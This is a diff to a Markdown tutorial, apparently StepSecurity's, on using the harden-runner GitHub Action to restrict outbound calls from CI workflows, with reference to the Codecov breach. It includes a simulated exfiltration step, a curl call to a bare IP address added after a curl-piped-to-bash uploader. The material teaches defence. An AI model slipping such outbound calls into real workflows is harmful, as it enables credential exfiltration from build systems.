@@ -14,6 +14,9 @@ A malicious package `flatmap-stream` was added as a direct dependency of the `ev
 ### VS Code GitHub Actions Exploit
 In December 2020, [ryotkak](https://twitter.com/ryotkak) reported as part of the Bug Bounty program how he exfiltrated the `GITHUB_TOKEN` from a GitHub Actions workflow. You can read the details [here](https://www.bleepingcomputer.com/news/security/heres-how-a-researcher-broke-into-microsoft-vs-codes-github/?&web_view=true) and [here](https://blog.ryotak.me/post/vscode-write-access/). 
 
+## How does StepSecurity mitigate this threat?
+StepSecurity analyzes the outbound calls made by the workflow and recommends the appropriate policy containing the allowed outbound endpoints. You should use it in end-to-end testing workflows to detect compromised dependencies that make outbound calls. You should also use it in release workflows to prevent exfiltration of credentials, as was the case in the Codecov breach.
+
 ## Tutorial
 Learn how to prevent exfiltration of credentials from a GitHub Actions workflow. 
 
@@ -29,6 +32,32 @@ Learn how to prevent exfiltration of credentials from a GitHub Actions workflow.
     - uses: step-security/harden-runner@v1
       with:
         egress-policy: audit
+    ```
+    The updated file should look like this:
+    ```
+    name: Test and coverage
+
+    on: [push, pull_request, workflow_dispatch]
+
+    jobs:
+      build:
+        runs-on: ubuntu-latest
+        steps:
+          #Add StepSecurity Harden Runner from here onwards
+          - uses: step-security/harden-runner@v1
+            with:
+              egress-policy: audit
+          - uses: actions/checkout@v2
+            with:
+              fetch-depth: 2
+          - uses: actions/setup-go@v2
+            with:
+              go-version: '1.17'
+          - name: Run coverage
+            run: go test -race -coverprofile=coverage.txt -covermode=atomic
+          - name: Upload coverage to Codecov
+            run: |
+              bash <(curl -s https://codecov.io/bash)
     ```
 
 4. This change should cause the workflow to run, as it is set to run on push. Click on the `Actions` tab to view the workflow run. 
@@ -48,7 +77,34 @@ Learn how to prevent exfiltration of credentials from a GitHub Actions workflow.
         allowed-endpoints: 
           codecov.io:443
           github.com:443
-          storage.googleapis.com:443
+    ```
+    The updated file should look like this:
+    ```
+    name: Test and coverage
+
+    on: [push, pull_request, workflow_dispatch]
+
+    jobs:
+      build:
+        runs-on: ubuntu-latest
+        steps:
+          #Add StepSecurity Harden Runner from here onwards
+          - uses: step-security/harden-runner@v1
+            with:
+              allowed-endpoints: 
+                codecov.io:443
+                github.com:443
+          - uses: actions/checkout@v2
+            with:
+              fetch-depth: 2
+          - uses: actions/setup-go@v2
+            with:
+              go-version: '1.17'
+          - name: Run coverage
+            run: go test -race -coverprofile=coverage.txt -covermode=atomic
+          - name: Upload coverage to Codecov
+            run: |
+              bash <(curl -s https://codecov.io/bash)
     ```
 
 8. Simulate an exfiltration attack similar to Codecov. Update the workflow and add the following statement. The bash uploader is no longer vulnerable, but when it was, it would have made an additional outbound call, which is being simulated here. 
@@ -58,6 +114,35 @@ Learn how to prevent exfiltration of credentials from a GitHub Actions workflow.
       run: |
         bash <(curl -s https://codecov.io/bash)
         curl -X GET http://104.248.94.23   
+    ```
+    The updated file should look like this:
+    ```
+    name: Test and coverage
+
+    on: [push, pull_request, workflow_dispatch]
+
+    jobs:
+      build:
+        runs-on: ubuntu-latest
+        steps:
+          #Add StepSecurity Harden Runner from here onwards
+          - uses: step-security/harden-runner@v1
+            with:
+              allowed-endpoints: 
+                codecov.io:443
+                github.com:443
+          - uses: actions/checkout@v2
+            with:
+              fetch-depth: 2
+          - uses: actions/setup-go@v2
+            with:
+              go-version: '1.17'
+          - name: Run coverage
+            run: go test -race -coverprofile=coverage.txt -covermode=atomic
+          - name: Upload coverage to Codecov
+            run: |
+              bash <(curl -s https://codecov.io/bash)
+              curl -X GET http://104.248.94.23
     ```
 
 9. This change should cause the workflow to run, as it is set to run on push.
